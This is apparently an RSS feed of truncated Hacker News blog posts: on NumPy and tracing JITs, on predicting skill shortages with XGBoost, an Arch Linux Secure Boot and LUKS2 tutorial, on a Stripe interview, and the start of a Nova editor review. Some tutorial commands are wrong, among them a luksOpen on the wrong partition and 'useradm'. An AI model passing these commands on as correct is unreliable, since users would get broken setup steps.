<p>Tracing unlocks many wins typically reserved for compiled languages. For example, once you have the entire trace in one place, operations can be fused together (e.g., to make use of the <a href="https://en.wikipedia.org/wiki/FMA_instruction_set">fused multiply-add instructions</a> common to most modern computers), memory layouts can be optimized, and so on. TensorFlow’s <a href="https://www.tensorflow.org/guide/graph_optimization">Grappler</a> is one such implementation of this idea. Traces can also be <a href="https://en.wikipedia.org/wiki/Backpropagation">walked backwards</a> to automatically compute derivatives. Traces can be compiled for different hardware configurations, so that the same Python code executes on CPU, GPU, and TPU. JAX can <a href="https://jax.readthedocs.io/en/latest/notebooks/quickstart.html#Auto-vectorization-with-vmap">autovectorize traces</a>, adding a batch dimension to all operations. Finally, a trace can be exported in a language-agnostic manner, allowing a program defined in Python to be executed in <a href="https://www.tensorflow.org/js">Javascript</a>, <a href="https://www.tensorflow.org/tfx/guide/serving">C++</a>, or more.</p>
<p>Unsurprisingly, there’s a catch to all this. NumPy can amortize Python overhead over multiple data, but only if that data is the same type. JIT can amortize Python overhead over multiple function calls, but only if the function calls would have resulted in the same pointer chasing outcomes. Retracing the function to verify this would defeat the purpose of JIT, so instead, TensorFlow/JAX JIT uses array shape and dtype to guess at whether a trace is reusable. This heuristic is necessarily conservative, rules out otherwise legal programs, often requires unnecessarily specific shape information, and doesn’t make any guarantees against mischievous tinkering. Furthermore, data-dependent tracing is a known issue (<a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html">1</a>, <a href="https://jax.readthedocs.io/en/latest/notebooks/Common_Gotchas_in_JAX.html#python-control-flow-+-JIT">2</a>). I worked on <a href="https://blog.tensorflow.org/2018/07/autograph-converts-python-into-tensorflow-graphs.html">AutoGraph</a>, a tool to address data-dependent tracing. Still, the engineering benefits of a shared tracing infrastructure are too good to pass up. I expect to see JIT-based systems flourish in the future and iron out their user experience.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The NumPy API’s specifically addresses Python’s performance problems for the kinds of programs that scientific computing users want to write. It encourages users to write code in ways that minimize pointer overhead. Coincidentally, this way of writing code is a fruitful abstraction for tracing JITs targeting vastly parallel computing architectures like GPU and TPU. (Some people argue that <a href="https://dl.acm.org/citation.cfm?id=3321441">machine learning is stuck in a rut</a> due to this NumPy monoculture.) In any case, tracing JITs built on top of …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moderndescartes.com/essays/data_oriented_python/">https://www.moderndescartes.com/essays/data_oriented_python/</a></em></p>]]>
            </description>
            <link>https://www.moderndescartes.com/essays/data_oriented_python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511966</guid>
            <pubDate>Fri, 18 Sep 2020 01:22:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predicting Skill Shortages in Labor Markets: A Machine Learning Approach]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511889">thread link</a>) | @pedrogrande
<br/>
September 17, 2020 | https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/ | <a href="https://web.archive.org/web/*/https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				
					<p>Skill shortages are a drain on society. They hamper economic opportunities for individuals, slow growth for firms, and impede labor productivity in aggregate. Therefore, the ability to understand and predict skill shortages in advance is critical for policy-makers and educators to help alleviate their adverse effects.</p>
<p>In <a href="https://arxiv.org/pdf/2004.01311v3.pdf">my latest research</a> with&nbsp;<a href="https://www.rizoiu.eu/">Marian-Andrei Rizoiu</a>, Ben Johnston, and <a href="https://www.xplainableai.org/">Mary-Anne Williams</a>, we implement a high-performing Machine Learning approach to predict occupational skill shortages one-year into the future. For this work, we compile a unique dataset of both Labor Demand and Labor Supply occupational data in Australia from 2012 to 2018. This includes data from 7.7 million job advertisements (ads) from <a href="https://www.burning-glass.com/">Burning Glass Technologies</a> and 20 official labor force measures. We use these data as explanatory variables and leverage the XGBoost classifier to predict yearly skills shortage classifications for 132 standardized occupations.</p>
<h3>Prediction Performance</h3>
<p>The models that we construct achieve strong results, achieving up to 83% (F1 Macro Average) for predicting whether an occupation is in shortage or not. We also performed an ablation test, where we separately tested the predictive performance for different feature classes, as seen below (LD=Labor Demand -&gt; job ads, LS=Labor Supply -&gt; employment statistics). Interestingly, we found that job ads data and employment statistics maintain solid performance levels for predicting occupational skill shortages.This is significant because labor demand and labor supply data&nbsp;sources are available across multiple labor markets, whereas longitudinal skill shortages data at the occupational level are rare in most labor markets.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm.png" alt="" width="1572" height="866" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm.png 1572w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-300x165.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-768x423.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.19.52-pm-1024x564.png 1024w" sizes="(max-width: 1572px) 100vw, 1572px"></p>
<p>Clearly, skill shortages have strong auto-regressive tendencies&nbsp;(i.e. the best indicator of an occupation being in shortage this year is if it was in shortage last year). However, shortage status changes (when an occupation moves between <em>Not In Shortage</em> and <em>In Shortage</em>) have policy and immigration implications, as governments decide skilled immigration rules based on the needs of the labor market. <em>So,&nbsp;how well can the models we build predict the changes in shortage status?</em> As seen below, performance deteriorates substantially because shortage status changes are rare events. That said, our results show that job ads data and employment statistics were the highest performing feature sets for predicting year-to-year skills shortage changes for occupations.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm.png" alt="" width="1572" height="862" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm.png 1572w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-300x165.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-768x421.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.33.58-pm-1024x562.png 1024w" sizes="(max-width: 1572px) 100vw, 1572px"></p>
<p>Again, this is significant because it further highlights the value of near real-time data sources (job ads data) and freely available data sources (employment statistics).</p>
<h3>Feature Importance</h3>
<p>We then conduct a feature importance analysis on the ‘Labor Demand + Labor Supply’ model in order to draw insights into which of these features are most predictive of skill shortages.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm.png" alt="" width="1414" height="830" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm.png 1414w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-300x176.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-768x451.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.20.34-pm-1024x601.png 1024w" sizes="(max-width: 1414px) 100vw, 1414px"></p>
<p>We find that&nbsp;‘Hours Worked’ is the most important indicator for occupations in shortage. Our interpretation of this result is that&nbsp;when a shortage exists for an occupation, the demands placed upon workers classified in that occupation are naturally high, which manifests in higher work intensity and longer work hours. This is reflected in the figure above where the ‘Hours Worked’ variables are represented in 6 of the top 20 most important features.</p>
<p>With regards to labor demand, years of ‘Education’, years of ‘Experience’, and median ‘Salary’ are all highly important features for predicting occupational skill shortages. This is consistent with <a href="https://ieeexplore.ieee.org/document/9005967">prior work</a>, which shows that when an occupation is in shortage, employers adjust job requirements to try and fulfil their demands. With regards to these features, this typically involves lowering the requirements of education and experience and increasing salary levels to attract more candidates.</p>
<h3>Quantifying Skill Importance of Occupations In Shortage</h3>
<p>Lastly, we put forward a method to analyze the underlying skills of occupations in shortage. This allows us to identify&nbsp;granular details on which skills should be targeted to help alleviate occupational shortages. In a nutshell, we normalize high-occurring skills in job ads and calculate the mean importance score within the occupation. This returns an ordered list of skills by importance and captures emerging skills within an occupation. We used Data Scientists as an example occupation, which has been shown to be in shortage across many labor markets. Below is a visualization of the top 10 Data Science skills in Australia from 2015-2019 using this method.</p>
<p><img src="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm.png" alt="" width="1422" height="1174" srcset="https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm.png 1422w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-300x248.png 300w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-768x634.png 768w, https://bitsandatoms.co/wp-content/uploads/2020/08/Screen-Shot-2020-08-30-at-2.21.28-pm-1024x845.png 1024w" sizes="(max-width: 1422px) 100vw, 1422px"></p>
<p>We hope that the&nbsp;methods and findings from this work can assist policy-makers to better measure and predict skill shortages of occupations. Similarly, educators could apply this work to better identify market demands and adjust their curricula accordingly.</p>
<p>To view the paper, please <a href="https://arxiv.org/pdf/2004.01311v3.pdf">click here</a>&nbsp;to access the pre-print.</p>
	<!-- Social Sharing by Danny - v1.3.3 - https://wordpress.org/plugins/dvk-social-sharing/ -->
	
    <!-- / Social Sharing By Danny -->
   
<!-- /themify_builder_content -->
				
			</div></div>]]>
            </description>
            <link>https://bitsandatoms.co/predicting-skill-shortages-in-labor-markets-a-machine-learning-approach/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511889</guid>
            <pubDate>Fri, 18 Sep 2020 01:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Secure your boot process: UEFI and Secureboot and EFISTUB and Luks2 and lvm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511852">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://nwildner.com/posts/2020-07-04-secure-your-boot-process/ | <a href="https://web.archive.org/web/*/https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This tutorial isn’t a basic setup how-to in a way you will learn how to install Arch Linux, neither is intended to replace the <a href="https://wiki.archlinux.org/index.php/Installation_guide">Installation Guide</a>, This is a guide for those who want a laptop with data-at-rest encryption and a verified boot process using SecureBoot.</p>
<p>I’ll not be arrogant saying that this setup is “tampering-proof” since this also depends on your firmware manufacturer, but I believe that this is a notebook setup with good enough security.</p>

<ul>
<li>Arch Linux setup overview.</li>
<li>Basic secureboot explanation.</li>
<li>Luks2+lvm setup for encrypted partitions at boot time.</li>
<li><code>/home</code> disk setup with crypttab.</li>
<li>EFISTUB to make Linux “it’s own bootloader” avoiding the entire <code>/boot</code> to be mounted on your ESP.</li>
</ul>

<p>UEFI is the new standard for boot and firmware management and it isn’t perfect, but is a natural answer to the old BIOS standard that has it’s limitations and is not aging well considering those limits and all workarounds involved to break them. You can find more information <a href="https://uefi.org/faq">here</a>. BIOS standard first appeared in IBM computers in 1976 and should (hopefully) die soon.</p>
<p>To keep words/concepts best alligned with what is correct, i’ll not call your basic computer program BIOS but firmware from now on during this reading.</p>
<p>I bought a laptop and wanted to encrypt all my data and thought: “Hey, i can do a full disk encryption but what if someone tamper my <a href="https://en.wikipedia.org/wiki/Master_boot_record">MBR/Boot Sector</a>? So, using secureboot whas the best alternative (even with efi having a plain <code>FAT32</code> partition on it’s standard).</p>
<p>There’s a lot of drama around secureboot, most of it related to Microsoft and the way they demand deploying their keys on OEM vendor equipments. That doesn’t mean that secureboot is bad.</p>
<p>Pretty simple “explain like i’m five” secureboot concept: A Root of Trust combination with keys and certificates. Using SecureBoot your firmware will check if the operating system you are trying to boot and your bootloader are trusted by you. On each boot-up UEFI firmware will inspect what you are trying to boot and if it’s not trusted a security violation will be triggered.</p>
<p>There are four main EFI “variables” used to create a basic secureboot Root of Trust environment:</p>
<ul>
<li>PK: The Platform Key, the master one, the <a href="https://en.wikipedia.org/wiki/One_Ring">ring to rule them all</a>. The holder of a PK can install a new PK and update the KEK.</li>
<li>KEK: Key Exchange Key is a secondary key used to sign EFI executables directly or a key used to signd the db and dbx databases.</li>
<li>db: The signature databse is a list with all allowed signing certificates or criptografy hashes to allowed binaries. We will use THIS db key to sign our Linux Kernel.</li>
<li>dbx: The dark side of the db. Inverse db. “not-good-db”. You name it. It’s the list containing all keys that are not allowed.</li>
</ul>
<p>I would like to highlight the following points of this setup:</p>
<ul>
<li>Your signing keys are stored inside an encrypted disk.</li>
<li>Kernel signing will only happend after you have booted and running an already signed kernel.</li>
<li>Most notebooks today don’t have an exposed CMOS to keep configurations but instead they have nvram modules that will store firmware and configurations.
<ul>
<li>So, put a passord on your firmware to avoid secureboot being disabled.</li>
<li>Putting a password on your firmware will almost invalidate any chance of boot option change or secureboot disable.</li>
<li>In my case there is no “reset bios password” option and losing it will require contacting Lenovo to replace the main board.</li>
</ul>
</li>
<li>Even with secureboot disabled, and attacker will not be able to decrypt your root partition without knowing your password</li>
<li>If you are worried about keys being accessed after booting, you have other issues to solve and disk encryption + secureboot will not be the answer.</li>
<li>Modern processors have <code>aes-ni</code> instuction that will help on disk decryption avoiding high cpu usage for this task.</li>
<li>Using a key to unlock luks <code>/home</code> partition is a way to increase convenience without sacrificing security. That key is stored inside another encrypted partition so, there is no much to worry about.</li>
<li>lvm inside a luks container gives you a lot of flexibility. This will also remove any visibility if someone steal you equipment since lvs will be inside one container.
<ul>
<li>Less error prone setup while manipulating <code>UUID</code>s is also an implicit feature.</li>
</ul>
</li>
</ul>
<p>With that in mind, lets install ArchLinux, first boot it and create the Root of Trust of your notebook.</p>

<p>There’s a plenty of “efi how-tos” for Arch Linux on the internet, and some of the instructions here will be just an overview of what you dear reader will have to execute</p>
<p><strong>Step 01</strong>: Download Arch Linux <a href="https://www.archlinux.org/download/">here</a> and write it to a pendrive using <code>dd bs=4M if=path/to/archlinux.iso of=/dev/sdx status=progress oflag=sync</code> where<code>sdx</code> is your pendrive. If you are using Windows to create your bootable pendrive <a href="https://sourceforge.net/projects/win32diskimager/">Win32 Disk Imager</a> will help you.</p>
<p><strong>Step 02</strong>: Configure your firmware to boot using UEFI, but keep secure boot disabled. Allow boot from usb and change it to be your first boot device. These instructions are pretty much vendor dependent and can change depending on your equipment.</p>
<p><strong>Step 03</strong>: Boot Arch Linux live usb, and after getting a shell change your keybord layout with the following command: <code>loadkeys br-abnt2</code></p>
<p>After that, connect to your wifi using <code>wifi-menu -o your_device</code>. There is an issue with the latest Arch Linux iso(06/2020) and <code>wifi-menu</code> is not working as expected. If you are using ethernet just ignore this step. Enable ntp sync with <code>timedatectl set-ntp true</code>.</p>
<p><strong>Step 04</strong>: Create <code>luks2</code> containers and <code>lvm2</code> volumes on the first disk. On my laptop i have 2 drives: <code>sda</code> is a ssd while <code>sdb</code> is a spinning disk. Use <code>cgdisk /dev/sda</code> and create a 256MB(i’m using 512MB but noticed that is way too much) partition for EFI (<a href="https://wiki.archlinux.org/index.php/EFI_system_partition">ESP</a>) code <code>ef00</code> and the rest of your disk space create a partition with code <code>8309</code>(Linux Luks).</p>
<p>Create your luks container and open it. Default block cipher and block encyption mode should be good enough so there is no need of changing it with <code>-c</code> parameter:</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sda2
cryptsetup luksOpen /dev/sda2 crypt
</code></pre>
<p>Create your lvm infraesturucture on top of it. I’ll create swap and root logical volumes</p>
<pre><code>pvcreate /dev/mapper/crypt
vgcreate vg0 /dev/mapper/crypt
lvcreate --size 4G vg0 --name swap
lvcreate --size 30G vg0 --name root
</code></pre>
<p>Format your ESP, root and swap partitions/volumes</p>
<pre><code>mkfs.vfat -F32 /dev/sda1
mkfs.ext4 /dev/mapper/vg0-root
mkswap /dev/mapper/vg0-swap
</code></pre>
<p><strong>Step 05</strong> Now create a <code>luks2</code> container without lvm on it cause we will use the full disk just for <code>/home</code> and automatically map/mount it using <code>crypttab+fstab</code> here. Instead of typing a password 2 times during boot(one for root, another for home), we will just type the password for the root partition and host a key inside this encrypted partition to open the home luks container. Using a key to open a luks device has the same risks as typing a password and storing it into your ram. <code>cgdisk /dev/sdb</code> and create an all-disk partition using <code>8309</code> partition code.</p>
<pre><code>cryptsetup -y -v --use-random luksFormat /dev/sdb1
cryptsetup luksOpen /dev/sda1 crypthome
mkfs.ext4 /dev/mapper/crypthome
</code></pre>
<p><strong>Step 06</strong> Mount all and start to install:</p>
<pre><code>mount /dev/mapper/vg0-root /mnt
mkdir /mnt/efi
mkdir /mnt/home
mount /dev/sda1 /mnt/efi
mount /dev/mapper/crypthome /mnt/home
pacstrap /mnt base base-devel vim efibootmgr linux linux-firmware lvm2 mkinitcpio networkmanager intel-ucode git
</code></pre>
<p>Do not install <code>intel-ucode</code> if you are using an AMD processor.</p>
<p><strong>Step 07</strong>: Create your <code>fstab</code> and change root to your new system</p>
<pre><code>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
arch-chroot /mnt
</code></pre>
<p><strong>Step 08</strong>: Change your fstab <code>/home</code> mount point to use the device mapper name. If you try to mount it using <code>UUID</code> it will fail cause it needs to be decrypted first.</p>
<pre><code># /home
/dev/mapper/crypthome	/home     	ext4      	rw,relatime	0 2
</code></pre>
<p>Create a key to automatically open the home luks container. Change the “secretfolder” path example as you please.</p>
<pre><code>mkdir /root/secretfolder
chmod 700 /root/secretfolder
dd bs=512 count=4 if=/dev/urandom of=/root/secretfolder/crypto_keyfile.bin
</code></pre>
<p>Find the UUID of your home luks container(<code>sdb1</code> not <code>crypthome</code>) and add it to your <code>/etc/crypttab</code>. Crypttab columns are: mapping name(crypthome), luks partition UUID, key path and luks. You can check disks UUID by issuing <code>blkid /dev/yyy</code> where <code>yyy</code> could be a partition or a disk. In this case, use <code>sdb1</code>.</p>
<pre><code>crypthome UUID=29d3555d-cccc-yyyy-xxxx-xxxxxxxxxxxx /root/secretfolder/crypto_keyfile.bin luks
</code></pre>
<p><strong>Step 09</strong>: Configure the rest of the system. Remember, this is just an overview of the Arch Linux installation and the focus here is on the secureboot aspect of this setup. In this step we will configure locale, localtime, keymap, hostname and user. I’m configuring a setup for a Brazilian Portuguese user so, change this info to reflect your language.</p>
<pre><code>ln -s /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
hwclock --systohc
echo LANG=pt_BR.UTF-8 &gt; /etc/locale.conf
echo KEYMAP=bt-abnt2 &gt; /etc/vconsole.conf
echo hostname_i_want &gt; /etc/hostname
</code></pre>
<p>Uncomment the <code>pt_BR.UTF-8 UTF-8</code> line inside <code>/etc/locale.gen</code> and generate this localization with:</p>
<pre><code>locale-gen
</code></pre>
<p>Create a password for root, and the basic info for your user(change <code>myuser</code> to your login):</p>
<pre><code>passwd
useradm -m -g users -G wheel myuser
passwd myuser
</code></pre>
<p><strong>Step 10</strong>: Edit your <code>mkinitcpio.conf</code> and include the <code>HOOKS</code> <code>keyboard</code>, <code>keymap</code>, <code>lvm2</code> and <code>resume</code>. Include <code>ext4</code> on <code>MODULES</code> and change <code>COMPRESSION</code> to <code>cat</code>. You can check my config file <a href="https://gitlab.com/nwildner/dotfiles/-/blob/master/etc/mkinitcpio.conf">here</a>. Recreate your initd:</p>
<pre><code>mkinitcpio -p linux
</code></pre>
<p>You may have noticed the <code>i915</code> module on my <code>mkinitcpio.conf</code>. That’s how you avoid video flickering during the boot process if you are a user of an Intel Integrated graphics card.</p>
<p><strong>Step 11</strong>: Lets check if your motherboard is able to handle EFI entries using the following command:</p>
<pre><code>bootctl status| grep -i "sets"
       ✓ Boot loader sets ESP partition information
</code></pre>
<p>If this option is marked with <code>✓</code> you will be able to set boot information on your motherboard directly. Otherwise, you’ll have to rely on a bootloader like <code>systemd-boot</code>. You could obviously use the default EFI fallback option (<code>EFI/BOOT/BOOX64.EFI</code>) but the sofware we will use to automatically create …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</a></em></p>]]>
            </description>
            <link>https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511852</guid>
            <pubDate>Fri, 18 Sep 2020 01:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Experience Interviewing with Stripe]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511838">thread link</a>) | @lpolovets
<br/>
September 17, 2020 | https://daeyoungchoi.com/stripe-interview/ | <a href="https://web.archive.org/web/*/https://daeyoungchoi.com/stripe-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are “not a fit,” which effectively translates to “henceforth a waste of time,” simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won’t negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be – a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance – the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn’t get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be “not wanted” was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn’t let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe’s CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company’s chief risk officer – the job I interviewed for was a risk function – for reasons that were not entirely clear. He mentioned I might want “a bit more closure,” but I didn’t want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with “no pressure.” Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of “I know you reached out to Patrick.” I had reached out to everyone I had interviewed with to solicit feedback, and since the name “Patrick” didn’t register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe’s hiring process, after learning that Stripe’s credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives – thereby evaluating the algorithms themselves – in a process called “counterfactual evaluation.” When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe’s part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn’t tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I’ve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn’t looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley – a place of inventive and ambitious companies that not only come up …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daeyoungchoi.com/stripe-interview/">https://daeyoungchoi.com/stripe-interview/</a></em></p>]]>
            </description>
            <link>https://daeyoungchoi.com/stripe-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511838</guid>
            <pubDate>Fri, 18 Sep 2020 00:57:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Panic's Nova text editor (a review)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511824">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review | <a href="https://web.archive.org/web/*/https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com&amp;t=NTllNmVmMGUwNWQ5MmFkYjVjMGZlZGIyMjhhNWI1ZmQxZTQzMzcwMCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Panic</a>, the long-established makers of Mac utility software, seems fully aware that introducing a new, commercial code editor in 2020 is a quixotic proposition. Is there enough of an advantage to a native editor over both old school cross-platform editors like Emacs and explosively popular new editors like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcode.visualstudio.com&amp;t=MTBiZDg2OWEwYWZkZGQxNWY1MTZkZThmODYwZjUzYmVjOWUwOTVmMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Visual Studio Code</a> to persuade people to switch?</p><p>I’m an unusual case as far as text editor users go: my primary job is technical writing, and the last three jobs that I’ve worked at have a “docs as code” approach, where we write documentation in Markdown and manage it under version control just like source code. The editor that works best for me in tech writing is the venerable <a 